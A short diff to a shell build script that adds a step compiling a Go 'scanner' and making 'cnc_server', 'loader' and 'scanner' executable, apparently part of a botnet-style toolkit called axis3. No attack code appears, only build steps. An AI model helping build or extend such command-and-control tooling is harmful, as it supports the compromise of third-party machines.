@@ -151,3 +151,20 @@ echo "  # OR use Docker:"
 echo "  docker build -t axis3-builder ."
 echo "  docker run -v \$(pwd):/workspace axis3-builder ./build.sh"
 echo ""
+
+# ============================================================================
+# Build Scanner
+# ============================================================================
+if command -v go &> /dev/null; then
+    echo ""
+    echo "[*] Building Scanner..."
+    cd scanner
+    go mod init scanner 2>/dev/null
+    go build -o ../scanner . 2>/dev/null && echo "[+] Scanner built" || echo "[-] Scanner failed"
+    cd ..
+else
+    echo "[-] Go not installed. Skipping scanner build."
+fi
+
+# Update permissions
+chmod +x cnc_server loader scanner 2>/dev/null
